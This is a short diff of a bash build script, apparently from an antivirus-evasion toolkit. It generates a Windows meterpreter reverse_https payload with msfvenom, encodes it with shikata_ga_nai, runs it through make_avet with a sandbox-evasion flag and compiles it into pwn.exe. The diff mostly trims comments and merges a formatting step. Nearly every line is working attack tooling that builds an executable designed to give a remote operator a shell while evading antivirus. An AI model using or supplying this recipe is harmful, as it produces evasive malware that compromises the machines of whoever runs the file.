@@ -1,5 +1,5 @@
-#!/bin/bash          
-# simple example script for building the .exe file
+#!/bin/bash
+# example build script
 
 # include script containing the compiler var $win32_compiler
 # you can edit the compiler in build/global_win32.sh
@@ -13,18 +13,12 @@
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
-# make meterpreter reverse payload, encoded with shikata_ga_nai
-# additionaly to the avet encoder, further encoding should be used
+# generate payload and call avet
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+./make_avet -f sc.txt -F
 
-# format the shellcode for make_avet
-./format.sh sc.txt > scclean.txt && rm sc.txt
-
-# call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion 
-./make_avet -f scclean.txt -F -E
-
-# compile to pwn.exe file
+# compile
 $win32_compiler -o pwn.exe avet.c
 
 # cleanup
-rm scclean.txt && echo "" > defs.h
+rm sc.txt && echo "" > defs.h
